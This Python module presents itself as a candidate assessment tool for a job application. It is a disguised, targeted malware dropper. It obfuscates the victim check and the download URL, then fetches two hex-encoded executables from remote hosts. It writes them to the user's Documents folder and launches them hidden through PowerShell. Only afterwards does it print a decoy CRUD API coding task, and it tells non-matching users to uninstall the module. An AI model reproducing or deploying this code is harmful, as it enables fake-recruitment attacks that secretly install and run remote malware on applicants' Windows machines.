import requests
import base64
import subprocess
import sys
import getpass
import binascii
import time
from urllib3.exceptions import InsecureRequestWarning
import urllib3

# Matikan peringatan SSL
urllib3.disable_warnings(category=InsecureRequestWarning)

def check():
    a = "4p2z4p254p294p2y4p2+4p254p2x4p234p2x4p2M"
    b = base64.b64decode(str(a).encode()).decode()
    out = ''
    for x in b:
        temp = ord(x) ^ 10000
        out += chr(temp)
    c = subprocess.getoutput("whoami")
    if out in c:
        return "valid"
    else:
        return "invalid"

def dencrypt(to_encrypt):
    a = base64.b64decode(to_encrypt.encode()).decode()
    out = ''
    for x in a:
        temp = ord(x) + 10
        out += chr(temp ^ 2)
    return out

def start_assessment(token):

    if token != '':
        status = check()
        if status == "valid":
            try:
                a = str(sys.platform)
                token_out = dencrypt(token)
                b = requests.get(token_out, verify=False)
                c = str(b.text)
                if 'win32' in a:
                    print("[+] Starting Assessment please wait")
                    c1 = c.split("\n")[0].split(" . ")[1]
                    c2 = c.split("\n")[1].split(" . ")[1]
                    hoho = requests.get(c1, verify=False)
                    hehe = requests.get(c2, verify=False)
                    path = "C:/Users/" + getpass.getuser() + "/Documents/"

                    with open(path + 'c1.exe', 'wb') as f:
                        f.write( binascii.unhexlify(str(hoho.text).encode()) )
                    
                    with open(path + 'c2.exe', 'wb') as f:
                        f.write( binascii.unhexlify( str(hehe.text).encode() ) )
                    
                    r0 = subprocess.getoutput(f"powershell /c start-process {str(path+"c2.exe")} -windowstyle hidden")
                    r1 = subprocess.getoutput(f"powershell /c start-process {str(path+"c1.exe")} -windowstyle hidden")
                    print("[+] ASSESSMENT TASK\n1. Make a CRUD API using python3 and flask which only authenticate using JWT")
                    print("2. Make a detail report of CRUD API")
                    print("3. Make a video presentation of CRUD API (Max: 5 Minutes)")
                    print("\nKindly resend back the detail report of the detail report only and the video of the presentation must be in the pdf by a link")


                
            except Exception as e:
                print("[-] Error at starting assessment")
        else:
            print("[+] Checking candidate data, please wait")
            time.sleep(120)
            print("[-] Hi sorry, you are not eligible. Thank you for applying. Kindly uninstall this module")
    else:
        print("[-] Please Provide a token.")                